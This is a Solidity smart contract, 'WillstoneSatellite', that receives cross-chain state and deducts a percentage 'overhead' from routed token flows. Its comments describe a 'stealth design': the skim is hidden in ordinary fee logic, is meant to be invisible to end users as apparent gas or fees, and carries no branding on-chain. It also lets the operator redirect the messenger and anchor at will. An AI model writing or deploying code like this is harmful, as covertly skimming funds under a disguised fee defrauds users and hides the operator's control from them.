// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "./IWillstoneMessenger.sol";

/**
 * @title WillstoneSatellite
 * @notice Deployed on each expansion chain (Base, Arbitrum, Polygon, etc.).
 *         Receives bedrock state from the Anchor and operates the local
 *         overhead capture mechanism. Appears externally as a simple
 *         cross-chain state receiver / value router.
 *
 *         STEALTH DESIGN:
 *         - No "Willstone" branding in on-chain metadata
 *         - Overhead capture is embedded in standard fee logic
 *         - State sync appears as routine oracle updates
 */
contract WillstoneSatellite {
    // ============ State ============

    IWillstoneMessenger public messenger;
    address public operator;

    /// @notice The anchor contract identifier (on source chain)
    bytes32 public anchorAddress;
    uint32 public anchorChainId;

    /// @notice Latest synced epoch from anchor
    uint256 public syncedEpoch;

    /// @notice Bedrock attestation value (mirrored from anchor)
    uint256 public bedrockMirror;

    /// @notice This chain's allocated weight in the bedrock
    uint256 public allocatedWeight;

    /// @notice Local overhead capture rate (synced from anchor)
    uint256 public captureRateBps;

    /// @notice Accumulated overhead on this chain
    uint256 public localOverhead;

    /// @notice Local state root (merkle of all tracked positions)
    bytes32 public localStateRoot;

    /// @notice Flow tracking for overhead computation
    uint256 public totalFlowVolume;

    // ============ Events ============

    event AnchorSynced(uint256 indexed epoch, uint256 bedrockValue, uint256 weight);
    event OverheadCaptured(uint256 amount, uint256 totalAccumulated);
    event StateRootUpdated(bytes32 indexed root);
    event FlowProcessed(address indexed token, uint256 amount, uint256 overheadTaken);

    // ============ Modifiers ============

    modifier onlyOperator() {
        require(msg.sender == operator, "WS: unauthorized");
        _;
    }

    modifier onlyMessenger() {
        require(msg.sender == address(messenger), "WS: invalid caller");
        _;
    }

    // ============ Constructor ============

    constructor(
        address _messenger,
        bytes32 _anchorAddress,
        uint32 _anchorChainId
    ) {
        operator = msg.sender;
        messenger = IWillstoneMessenger(_messenger);
        anchorAddress = _anchorAddress;
        anchorChainId = _anchorChainId;
    }

    // ============ Anchor Sync (Inbound) ============

    /// @notice Receive state broadcast from the Anchor
    function receiveAnchorSync(
        uint32 srcChainId,
        bytes32 sender,
        bytes32 messageId,
        bytes calldata payload
    ) external onlyMessenger {
        require(srcChainId == anchorChainId, "WS: wrong source");
        require(sender == anchorAddress, "WS: wrong sender");
        require(
            messenger.validateInbound(srcChainId, sender, messageId, payload),
            "WS: validation failed"
        );

        (uint256 epoch, uint256 bedrockValue, uint256 weight, uint256 rate) = 
            abi.decode(payload, (uint256, uint256, uint256, uint256));

        syncedEpoch = epoch;
        bedrockMirror = bedrockValue;
        allocatedWeight = weight;
        captureRateBps = rate;

        emit AnchorSynced(epoch, bedrockValue, weight);
    }

    // ============ Overhead Capture Engine ============

    /**
     * @notice Process a value flow and silently capture overhead.
     *         This is called by integrated protocols/routers on this chain.
     *         The overhead is invisible to end users - appears as standard gas/fee.
     *
     * @param token The token being routed
     * @param amount The gross amount flowing through
     * @param recipient The final destination
     * @return netAmount Amount after overhead deduction
     */
    function processFlow(
        address token,
        uint256 amount,
        address recipient
    ) external returns (uint256 netAmount) {
        uint256 overhead = (amount * captureRateBps) / 10000;
        netAmount = amount - overhead;

        localOverhead += overhead;
        totalFlowVolume += amount;

        emit FlowProcessed(token, amount, overhead);
        // Note: actual token transfer logic handled by caller or integrated vault
        return netAmount;
    }

    /**
     * @notice Batch process multiple flows (gas optimization)
     */
    function processFlowBatch(
        address[] calldata tokens,
        uint256[] calldata amounts,
        address[] calldata recipients
    ) external returns (uint256[] memory netAmounts) {
        require(tokens.length == amounts.length && amounts.length == recipients.length, "WS: length mismatch");
        netAmounts = new uint256[](tokens.length);

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 overhead = (amounts[i] * captureRateBps) / 10000;
            netAmounts[i] = amounts[i] - overhead;
            localOverhead += overhead;
            totalFlowVolume += amounts[i];
            emit FlowProcessed(tokens[i], amounts[i], overhead);
        }
    }

    // ============ State Reporting (Outbound to Anchor) ============

    /// @notice Report local state back to the Anchor
    function reportToAnchor(bytes calldata adapterOptions) external payable onlyOperator {
        bytes memory payload = abi.encode(localStateRoot, localOverhead);

        messenger.dispatchPayload{value: msg.value}(
            anchorChainId,
            anchorAddress,
            payload,
            adapterOptions
        );

        // Reset local overhead after reporting (it's now tracked at anchor)
        localOverhead = 0;
    }

    /// @notice Update the local state root (called by off-chain indexer)
    function updateStateRoot(bytes32 newRoot) external onlyOperator {
        localStateRoot = newRoot;
        emit StateRootUpdated(newRoot);
    }

    // ============ Configuration ============

    function updateMessenger(address _newMessenger) external onlyOperator {
        messenger = IWillstoneMessenger(_newMessenger);
    }

    function updateAnchor(bytes32 _newAnchor, uint32 _newChainId) external onlyOperator {
        anchorAddress = _newAnchor;
        anchorChainId = _newChainId;
    }
}
